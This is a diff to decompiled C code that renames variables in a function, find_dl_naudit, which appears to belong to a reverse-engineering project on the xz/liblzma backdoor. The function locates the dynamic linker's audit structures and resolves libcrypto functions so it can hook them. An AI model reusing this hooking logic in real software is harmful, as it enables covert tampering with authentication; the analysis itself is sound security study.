@@ -22,19 +22,19 @@ BOOL find_dl_naudit(elf_info_t *dynamic_linker_elf,elf_info_t *libcrypto_elf,
   Elf64_Ehdr *pEVar2;
   Elf64_Xword EVar3;
   dl_audit_symbind_alt_fn code_start;
-  BOOL BVar4;
+  BOOL success;
   Elf64_Sym *pEVar5;
   char *str;
-  Elf64_Sym *pEVar6;
-  u8 *puVar7;
-  uchar *puVar8;
+  Elf64_Sym *dsa_get0_pqg_symbol;
+  u8 *string_ref;
+  uchar *rtld_global_ro_ptr;
   lzma_allocator *allocator;
-  pfn_EVP_MD_CTX_free_t ppVar9;
-  uint *puVar10;
-  pfn_DSA_get0_pub_key_t ppVar11;
+  pfn_EVP_MD_CTX_free_t evp_md_ctx_free_fn;
+  uint *slot_ptr;
+  pfn_DSA_get0_pub_key_t dsa_get0_pub_key_fn;
   long lVar12;
-  dasm_ctx_t *pdVar13;
-  u8 *code_start_00;
+  dasm_ctx_t *dasm_cursor;
+  u8 *scan_cursor;
   uint *mem_address;
   byte bVar14;
   EncodedStringId local_8c;
@@ -49,63 +49,63 @@ BOOL find_dl_naudit(elf_info_t *dynamic_linker_elf,elf_info_t *libcrypto_elf,
     local_8c = STR_GLRO_dl_naudit_naudit;
     str = elf_find_string(dynamic_linker_elf,&local_8c,(void *)0x0);
     if (str != (char *)0x0) {
-      pEVar6 = elf_symbol_get(libcrypto_elf,STR_DSA_get0_pqg,0);
-      puVar7 = (u8 *)elf_get_code_segment(dynamic_linker_elf,&local_88);
-      if ((puVar7 != (u8 *)0x0) &&
-         (puVar7 = find_string_reference(puVar7,puVar7 + local_88,str), puVar7 != (u8 *)0x0)) {
-        if (pEVar6 != (Elf64_Sym *)0x0) {
-          EVar1 = pEVar6->st_value;
+      dsa_get0_pqg_symbol = elf_symbol_get(libcrypto_elf,STR_DSA_get0_pqg,0);
+      string_ref = (u8 *)elf_get_code_segment(dynamic_linker_elf,&local_88);
+      if ((string_ref != (u8 *)0x0) &&
+         (string_ref = find_string_reference(string_ref,string_ref + local_88,str), string_ref != (u8 *)0x0)) {
+        if (dsa_get0_pqg_symbol != (Elf64_Sym *)0x0) {
+          EVar1 = dsa_get0_pqg_symbol->st_value;
           pEVar2 = libcrypto_elf->elfbase;
           imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
           imported_funcs->DSA_get0_pqg = (pfn_DSA_get0_pqg_t)(pEVar2->e_ident + EVar1);
         }
-        pdVar13 = &local_80;
+        dasm_cursor = &local_80;
         for (lVar12 = 0x16; lVar12 != 0; lVar12 = lVar12 + -1) {
-          *(undefined4 *)&pdVar13->instruction = 0;
-          pdVar13 = (dasm_ctx_t *)((long)pdVar13 + (ulong)bVar14 * -8 + 4);
+          *(undefined4 *)&dasm_cursor->instruction = 0;
+          dasm_cursor = (dasm_ctx_t *)((long)dasm_cursor + (ulong)bVar14 * -8 + 4);
         }
-        puVar8 = dynamic_linker_elf->elfbase->e_ident + pEVar5->st_value;
+        rtld_global_ro_ptr = dynamic_linker_elf->elfbase->e_ident + pEVar5->st_value;
         EVar3 = pEVar5->st_size;
         allocator = get_lzma_allocator();
         allocator->opaque = libcrypto_elf;
-        ppVar9 = (pfn_EVP_MD_CTX_free_t)lzma_alloc(0xd10,allocator);
-        imported_funcs->EVP_MD_CTX_free = ppVar9;
-        if (ppVar9 != (pfn_EVP_MD_CTX_free_t)0x0) {
+        evp_md_ctx_free_fn = (pfn_EVP_MD_CTX_free_t)lzma_alloc(0xd10,allocator);
+        imported_funcs->EVP_MD_CTX_free = evp_md_ctx_free_fn;
+        if (evp_md_ctx_free_fn != (pfn_EVP_MD_CTX_free_t)0x0) {
           imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
         }
         mem_address = (uint *)0x0;
-        code_start_00 = puVar7 + -0x80;
-        while (code_start_00 < puVar7) {
-          BVar4 = find_instruction_with_mem_operand_ex
-                            (code_start_00,puVar7,&local_80,0x10b,(void *)0x0);
-          code_start_00 = code_start_00 + 1;
-          if (BVar4 != FALSE) {
+        scan_cursor = string_ref + -0x80;
+        while (scan_cursor < string_ref) {
+          success = find_instruction_with_mem_operand_ex
+                            (scan_cursor,string_ref,&local_80,0x10b,(void *)0x0);
+          scan_cursor = scan_cursor + 1;
+          if (success != FALSE) {
             if ((local_80.prefix.decoded.flags2 & 1) != 0) {
-              puVar10 = (uint *)local_80.mem_disp;
+              slot_ptr = (uint *)local_80.mem_disp;
               if (((uint)local_80.prefix.decoded.modrm & 0xff00ff00) == 0x5000000) {
-                puVar10 = (uint *)((u8 *)(local_80.mem_disp + (long)local_80.instruction) +
+                slot_ptr = (uint *)((u8 *)(local_80.mem_disp + (long)local_80.instruction) +
                                   local_80.instruction_size);
               }
-              if (((((byte)local_80.prefix.decoded.rex & 0x48) != 0x48) && (puVar8 < puVar10)) &&
-                 (puVar10 + 1 <= puVar8 + EVar3)) {
-                mem_address = puVar10;
+              if (((((byte)local_80.prefix.decoded.rex & 0x48) != 0x48) && (rtld_global_ro_ptr < slot_ptr)) &&
+                 (slot_ptr + 1 <= rtld_global_ro_ptr + EVar3)) {
+                mem_address = slot_ptr;
               }
             }
-            code_start_00 = local_80.instruction + (ulong)local_80.insn_offset + 1;
+            scan_cursor = local_80.instruction + (ulong)local_80.insn_offset + 1;
           }
         }
         if ((mem_address == (uint *)0x0) ||
            (code_start = (hooks->ldso_ctx)._dl_audit_symbind_alt,
-           BVar4 = find_instruction_with_mem_operand_ex
+           success = find_instruction_with_mem_operand_ex
                              ((u8 *)code_start,
                               (u8 *)(code_start + (hooks->ldso_ctx)._dl_audit_symbind_alt__size),
-                              (dasm_ctx_t *)0x0,0x10b,mem_address), BVar4 == FALSE)) {
-          ppVar11 = (pfn_DSA_get0_pub_key_t)imported_funcs->EVP_MD_CTX_free;
+                              (dasm_ctx_t *)0x0,0x10b,mem_address), success == FALSE)) {
+          dsa_get0_pub_key_fn = (pfn_DSA_get0_pub_key_t)imported_funcs->EVP_MD_CTX_free;
         }
         else {
-          ppVar11 = (pfn_DSA_get0_pub_key_t)lzma_alloc(0x468,allocator);
-          imported_funcs->DSA_get0_pub_key = ppVar11;
-          if (ppVar11 != (pfn_DSA_get0_pub_key_t)0x0) {
+          dsa_get0_pub_key_fn = (pfn_DSA_get0_pub_key_t)lzma_alloc(0x468,allocator);
+          imported_funcs->DSA_get0_pub_key = dsa_get0_pub_key_fn;
+          if (dsa_get0_pub_key_fn != (pfn_DSA_get0_pub_key_t)0x0) {
             imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
           }
           if ((*mem_address == 0) && (*(long *)(mem_address + -2) == 0)) {
@@ -114,9 +114,9 @@ BOOL find_dl_naudit(elf_info_t *dynamic_linker_elf,elf_info_t *libcrypto_elf,
             return TRUE;
           }
           lzma_free(imported_funcs->EVP_MD_CTX_free,allocator);
-          ppVar11 = imported_funcs->DSA_get0_pub_key;
+          dsa_get0_pub_key_fn = imported_funcs->DSA_get0_pub_key;
         }
-        lzma_free(ppVar11,allocator);
+        lzma_free(dsa_get0_pub_key_fn,allocator);
       }
     }
   }
